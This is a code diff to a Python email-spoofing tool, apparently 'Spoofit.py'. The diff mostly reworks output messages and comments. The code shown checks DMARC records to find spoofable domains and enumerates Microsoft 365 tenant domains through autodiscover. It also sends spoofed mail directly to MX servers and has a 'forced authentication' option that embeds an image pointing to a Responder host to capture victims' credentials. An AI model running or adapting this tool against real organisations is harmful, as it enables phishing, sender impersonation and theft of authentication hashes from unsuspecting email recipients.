@@ -8,7 +8,7 @@ import xml.etree.ElementTree as ET
 from urllib.request import urlopen, Request
 from urllib.error import HTTPError, URLError
 import csv
-import tldextract  # pip install tldextract for subdomain parsing
+import tldextract
 
 def print_banner():
     banner = r"""
@@ -35,7 +35,7 @@ def get_mx_record(domain):
 
 def send_email(mx_record, sender, recipient, subject, body):
     """
-    Attempts direct-to-MX delivery of an email. 
+    Attempts direct-to-MX delivery of an email.
     """
     try:
         with smtplib.SMTP(mx_record, 25) as server:
@@ -88,7 +88,7 @@ def create_forced_auth_email(body_template, responder_ip):
 
 def is_subdomain(domain):
     """
-    Returns True if 'domain' is a subdomain of the organizational domain.
+    Returns True if 'domain' is a subdomain (i.e. not the org domain).
     """
     extracted = tldextract.extract(domain)
     org_domain = f"{extracted.domain}.{extracted.suffix}"
@@ -97,8 +97,11 @@ def is_subdomain(domain):
 def check_spoofability(domain):
     """
     Checks if 'domain' can be spoofed based on DMARC:
-    - If subdomain, checks sp= in org domain if no DMARC found locally.
-    - Prints color-coded lines and returns result dict.
+    - If p=reject => not spoofable
+    - If p=quarantine => partial (Doubtful)
+    - If p=none or no DMARC => likely spoofable
+    - Subdomain logic: if org domain has sp=reject/quarantine => enforced
+      else subdomain is unprotected
     """
     RED = "\033[91m"
     GREEN = "\033[92m"
@@ -106,7 +109,9 @@ def check_spoofability(domain):
     RESET = "\033[0m"
 
     result = {"domain": domain, "policy": "", "spoofable": False}
+
     try:
+        # Attempt to retrieve a DMARC record for the domain
         try:
             dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
             dmarc_record = str(dmarc_answer[0]).lower()
@@ -114,34 +119,32 @@ def check_spoofability(domain):
             dmarc_record = None
 
         if dmarc_record:
+            # We have a direct DMARC record for this domain
             if "p=reject" in dmarc_record:
                 print(f"{RED}[-] Spoofing not possible for {domain}: DMARC p=reject (fully enforced).{RESET}")
                 result["policy"] = "p=reject (fully enforced)"
             elif "p=quarantine" in dmarc_record:
                 print(f"{YELLOW}[!] DMARC p=quarantine for {domain} (partial).{RESET}")
-                print(f"{YELLOW}[+] Spoofing might slip through if spam is recovered.{RESET}")
                 result["policy"] = "p=quarantine (partial)"
                 result["spoofable"] = True
             elif "p=none" in dmarc_record:
                 print(f"{YELLOW}[!] DMARC p=none for {domain} (not enforced).{RESET}")
-                print(f"{GREEN}[+] Spoofing possible — no enforcement.{RESET}")
                 result["policy"] = "p=none (not enforced)"
                 result["spoofable"] = True
             else:
-                print(f"{YELLOW}[!] DMARC record for {domain} found but unknown p= tag.{RESET}")
-                print(f"{GREEN}[+] Spoofing possible — no recognized policy.{RESET}")
+                print(f"{YELLOW}[!] DMARC record found for {domain} but unknown p= tag.{RESET}")
                 result["policy"] = "No recognized p= (treat as none)"
                 result["spoofable"] = True
-
         else:
+            # No DMARC at the domain => check if subdomain
             extracted = tldextract.extract(domain)
             org_domain = f"{extracted.domain}.{extracted.suffix}"
             if org_domain.lower() == domain.lower():
                 print(f"{YELLOW}[!] No DMARC for {domain}.{RESET}")
-                print(f"{GREEN}[+] Spoofing possible — no policy.{RESET}")
                 result["policy"] = "No record"
                 result["spoofable"] = True
             else:
+                # Subdomain => check if org domain has sp=...
                 try:
                     org_dmarc = dns.resolver.resolve(f"_dmarc.{org_domain}", "TXT")
                     org_record = str(org_dmarc[0]).lower()
@@ -157,17 +160,14 @@ def check_spoofability(domain):
 
                     if sp_tag == "reject":
                         print(f"{RED}[-] {domain} has no DMARC, but {org_domain} has sp=reject => subdomain protected.{RESET}")
-                        print(f"{RED}[-] Spoofing not possible for {domain}.{RESET}")
                         result["policy"] = "sp=reject (org domain)"
                     elif sp_tag == "quarantine":
                         print(f"{YELLOW}[!] {domain} no DMARC, {org_domain} sp=quarantine => partial subdomain.{RESET}")
-                        print(f"{YELLOW}[+] Spoofing might land in spam for subdomain {domain}.{RESET}")
                         result["policy"] = "sp=quarantine (org domain)"
                         result["spoofable"] = True
                     else:
                         if "p=reject" in org_record:
                             print(f"{YELLOW}[!] {domain} no DMARC; {org_domain} p=reject but no sp= => subdomain not enforced.{RESET}")
-                            print(f"{GREEN}[+] Spoofing possible for {domain}.{RESET}")
                             result["policy"] = "No sp= (org p=reject)"
                             result["spoofable"] = True
                         elif "p=quarantine" in org_record:
@@ -180,9 +180,23 @@ def check_spoofability(domain):
                             result["spoofable"] = True
                 else:
                     print(f"{YELLOW}[!] No DMARC for {domain} and no DMARC for {org_domain}.{RESET}")
-                    print(f"{GREEN}[+] Spoofing definitely possible.{RESET}")
                     result["policy"] = "No record (org none)"
                     result["spoofable"] = True
+
+        # After we've determined if it's spoofable, print the final "spoofing" line with nuance
+        if result["spoofable"]:
+            # If policy indicates 'quarantine', mention spam
+            if "quarantine" in result["policy"].lower():
+                print(f"{YELLOW}[+] Spoofing might slip through if spam is recovered.{RESET}")
+            else:
+                # If it's a subdomain => "maybe", else => "spoofing possible"
+                if is_subdomain(domain):
+                    print(f"{YELLOW}[!] Spoofing might be possible for subdomain: {domain}{RESET}")
+                else:
+                    print(f"{GREEN}[+] Spoofing possible for {domain}.{RESET}")
+        else:
+            # If we concluded not spoofable, we do not print a "spoofing possible" line
+            pass
 
     except Exception as e:
         print(f"[!] Error checking spoofability for {domain}: {e}")
@@ -191,19 +205,11 @@ def check_spoofability(domain):
     return result
 
 def autodiscover_endpoint(domain):
-    """
-    If domain ends with .gov, uses https://autodiscover-s.office365.us/autodiscover/autodiscover.svc
-    otherwise uses https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
-    """
     if domain.lower().endswith(".gov"):
         return "https://autodiscover-s.office365.us/autodiscover/autodiscover.svc"
     return "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"
 
 def enumerate_tenant_domains(domain):
-    """
-    Attempts to retrieve all accepted domains in the tenant, 
-    using the correct autodiscover endpoint for .gov or standard tenant.
-    """
     body = f"""<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages"
         xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types"
@@ -232,7 +238,6 @@ def enumerate_tenant_domains(domain):
             </GetFederationInformationRequestMessage>
         </soap:Body>
     </soap:Envelope>"""
-
     headers = {"Content-Type": "text/xml; charset=utf-8", "User-Agent": "AutodiscoverClient"}
     url = autodiscover_endpoint(domain)
 
@@ -258,10 +263,6 @@ def enumerate_tenant_domains(domain):
     return list(set(domains_found))
 
 def print_summary_table(dmarc_results):
-    """
-    Prints a color-coded summary of DMARC policies and spoofability
-    (excluding .onmicrosoft.com domains).
-    """
     GREEN = "\033[92m"
     YELLOW = "\033[93m"
     RESET = "\033[0m"
@@ -279,7 +280,6 @@ def print_summary_table(dmarc_results):
     for res in filtered:
         domain = res["domain"]
         policy = res["policy"]
-
         if res["spoofable"]:
             if "quarantine" in policy.lower():
                 spoof_str = "Doubtful"
@@ -295,9 +295,6 @@ def print_summary_table(dmarc_results):
     print("-" * 100 + "\n")
 
 def export_results_csv(dmarc_results, filename):
-    """
-    Exports the DMARC results to a CSV file, skipping .onmicrosoft.com domains.
-    """
     filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
     if not filtered:
         print(f"[!] No results to export to {filename} (all onmicrosoft?).")
@@ -325,10 +322,6 @@ def export_results_csv(dmarc_results, filename):
         print(f"[!] Error exporting to {filename}: {e}")
 
 def parse_tenant_name(domains, fallback_domain):
-    """
-    Determines the name for CSV file by parsing any .onmicrosoft.com domain
-    or falling back to the domain name.
-    """
     onmicrosoft = [d for d in domains if d.lower().endswith(".onmicrosoft.com")]
     if onmicrosoft:
         raw = onmicrosoft[0].lower()
@@ -358,7 +351,7 @@ Examples:
      Spoofit.py -s sender@domain.com -r recipients.txt
 
   5) Forced authentication:
-     Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder_ip
+     Spoofit.py -s sender@domain.com -r recipient@domain.com -f responder-ip
         """,
         formatter_class=argparse.RawTextHelpFormatter
     )
@@ -368,7 +361,7 @@ Examples:
     parser.add_argument('-s', '--sender', help='Spoofed sender email.')
     parser.add_argument('-r', '--recipients', help='Recipient email or file containing list of recipient emails.')
     parser.add_argument('-f', '--forced', metavar='RESPONDER_IP',
-                        help='Send email with embedded image pointing to Responder.')
+                        help='Forced authentication with responder-ip.')
 
     args = parser.parse_args()
     if not any(vars(args).values()):
